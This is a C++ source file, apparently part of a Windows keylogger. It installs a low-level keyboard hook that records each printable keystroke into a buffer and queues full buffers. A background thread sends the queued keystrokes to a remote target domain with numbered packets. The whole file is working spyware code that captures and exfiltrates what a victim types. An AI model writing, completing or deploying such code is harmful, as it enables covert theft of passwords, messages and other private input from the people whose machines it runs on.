#include "KeyLogger.h"
#include "Network.h"


LRESULT __stdcall process_key(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode < 0 || nCode != HC_ACTION) {
		return CallNextHookEx(nullptr, nCode, wParam, lParam);
	}

	if (wParam == WM_KEYDOWN) {
		PKBDLLHOOKSTRUCT key = reinterpret_cast<PKBDLLHOOKSTRUCT>(lParam);
		
		GetKeyState(VK_SHIFT);
		BYTE keyboardState[256];
		if (!GetKeyboardState(keyboardState)) {
			return CallNextHookEx(nullptr, nCode, wParam, lParam);
		}
		
		unsigned short translatedChar[2] = {0};
		
		int result = ToAsciiEx(key->vkCode, key->scanCode, keyboardState, 
		                       translatedChar, key->flags, keyboardLayout);
		
		if (result == 1) {
			char keyChar = static_cast<char>(translatedChar[0]);
			
			if (keyChar >= 32 && keyChar <= 126) {
				keystrokeBuffer += keyChar;
			}
			
			if (keystrokeBuffer.size() >= MAX_BUFFER) {
				{
					std::lock_guard<std::mutex> lock(queueMutex);
					sendQueue.push(keystrokeBuffer);
				}
				
				keystrokeBuffer.clear();
			}
		}
	}
	
	return CallNextHookEx(nullptr, nCode, wParam, lParam);
}

DWORD WINAPI senderThread(LPVOID lpParam) {
	while (!shouldStopSender) {
		std::string dataToSend;
		
		{
			std::lock_guard<std::mutex> lock(queueMutex);
			if (!sendQueue.empty()) {
				dataToSend = sendQueue.front();
				sendQueue.pop();
			}
		}
		
		if (!dataToSend.empty()) {
			int success = sendData(connectionId, packetNumber, 
			                       TARGET_DOMAIN.c_str(), dataToSend.c_str());
			
			if (success == 0) {
				packetNumber++;
				
				if (packetNumber > 999) {
					packetNumber = 0;
				}
			}
		} else {
			
			Sleep(100);
		}
	}
	
	return 0;
}